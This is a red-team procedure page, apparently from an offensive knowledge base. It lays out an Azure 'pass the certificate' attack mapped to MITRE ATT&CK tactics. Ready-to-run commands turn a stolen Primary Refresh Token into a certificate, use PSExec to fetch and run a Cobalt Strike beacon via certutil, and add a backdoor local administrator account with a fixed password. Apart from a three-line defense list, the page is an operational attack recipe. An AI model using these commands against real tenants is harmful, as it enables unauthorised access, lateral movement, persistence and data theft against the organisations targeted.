---
id: 6fe8b50a-7ea3-4aea-b0ad-19c6bb8f681d
name: 'Azure Pass the Certificate: AD Cert Request and RCE'
type: procedure
verified: true
submitted: true
created_at: '2023-04-06T03:56:15.756058+00:00'
updated_at: '2023-05-25T18:50:44.684982+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Cloud Service Discovery|T1526 - Cloud Service Discovery]]'
- '[[Remote Services|T1021 - Remote Services]]'
- '[[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]'
- '[[Valid Accounts|T1078 - Valid Accounts]]'
platforms:
- Cloud
- Windows
tags:
- '[[Certutil]]'
- '[[Cloud - Azure]]'
- '[[Pass The Certificate]]'
- '[[PSExec]]'
commands:
- '[[Azure Cert with PSExec: certutil download and execute Cobalt Strike beacon]]'
- '[[Azure Convert PRT to Certificate]]'
- '[[Use Azure Cert with PSExec remote add admin user]]'
---

# Azure Pass the Certificate: AD Cert Request and RCE

**Status**: ✓ Verified

## Summary

This procedure involves requesting and saving an Azure AD certificate and then using remote command execution to execute commands on the target system. This technique can be used to gain access to a system and execute commands remotely. The attacker can use this technique to move laterally across t

## Description

# Description

This procedure involves requesting and saving an Azure AD certificate and then using remote command execution to execute commands on the target system. This technique can be used to gain access to a system and execute commands remotely. The attacker can use this technique to move laterally across the network, escalate privileges, and exfiltrate data. This technique can be used in combination with other techniques to achieve the attacker's goals. 

Technical Explanation: The attacker requests and saves an Azure AD certificate to authenticate to the target system. Once authenticated, the attacker can remotely execute commands on the target system using remote command execution. This technique can be used to gain access to a system and execute commands remotely. 

Business Value: This technique can be used by an attacker to gain access to sensitive data, steal intellectual property, and disrupt business operations. By gaining access to a system remotely, the attacker can move laterally across the network, escalate privileges, and exfiltrate data. This can result in significant financial loss and reputational damage to the targeted organization.

## Requirements

1. Access to the target system

1. PRT, Tenant ID, Context, Derived Key

1. Remote command execution tool

Requirements 2 can be obtained from the [Pass the PRT Procedure](https://app.redstack.io/content/procedure/62e04165-3022-4f6d-af61-e18953cbd62d)

## Defense

1. Implement multi-factor authentication for Azure AD accounts to prevent unauthorized access

1. Monitor Azure AD certificate requests and revocations for suspicious activity

1. Use network segmentation to limit lateral movement across the network

## Objectives

1. Gain remote access to the target system

1. Execute commands on the target system

1. Move laterally across the network

1. Escalate privileges

1. Exfiltrate data

# Instructions

1. To request and save an Azure AD certificate, use the PrtToCert tool. The Cert will expire in 14 days.

**Command** ([[Azure Convert PRT to Certificate]]):

```bash
RequestCert.py --tenantId <TENANT-ID> --prt <PRT> --userName <Username>@<TENANT NAME>.onmicrosoft.com --hexCtx <HEX-CONTEXT> --hexDerivedKey <HEX-DERIVED-KEY>
```

> Note: Make sure to replace the <TENANT-ID>, <PRT>, <Username>, <TENANT NAME>, <HEX-CONTEXT>, and <HEX-DERIVED-KEY> placeholders with the actual values.

2. Use the Cert with PSExec to download and execute a C2 beacon using the AdureADJoinedMachinePTC (Main.py) tool:

**Command** ([[Azure Cert with PSExec: certutil download and execute Cobalt Strike beacon]]):

```bash
AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $TARGET_IP --command "certutil.exe -urlcache -split -f http://127.0.0.1:4444/beacon.exe C:\Windows\Temp\beacon.exe & C:\Windows\Temp\beacon.exe"
```

3. (Optional) Use the Cert with PSExec to create a persistent user using the AdureADJoinedMachinePTC (Main.py) tool:

**Command** ([[Use Azure Cert with PSExec remote add admin user]]):

```bash
AdureADJoinedMachinePTC.py --usercert <username>@<tenant>.onmicrosoft.com.pfx --certpass AzureADCert --remoteip $TARGET_IP --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
```

> This tool allows for remote command execution on a victim machine. The user must provide a valid user certificate and password for authentication. Once authenticated, the tool will execute the specified command on the victim machine using PSEXEC and open a CMD shell for the user to interact with.

## Platforms

- Cloud
- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]
- [[Initial Access|TA0001 - Initial Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Cloud Service Discovery|T1526 - Cloud Service Discovery]]
- [[Remote Services|T1021 - Remote Services]]
- [[Use Alternate Authentication Material|T1550 - Use Alternate Authentication Material]]
- [[Valid Accounts|T1078 - Valid Accounts]]

## Commands Used

- [[Azure Cert with PSExec: certutil download and execute Cobalt Strike beacon]]
- [[Azure Convert PRT to Certificate]]
- [[Use Azure Cert with PSExec remote add admin user]]

## Tags

- [[Certutil]]
- [[Cloud - Azure]]
- [[Pass The Certificate]]
- [[PSExec]]
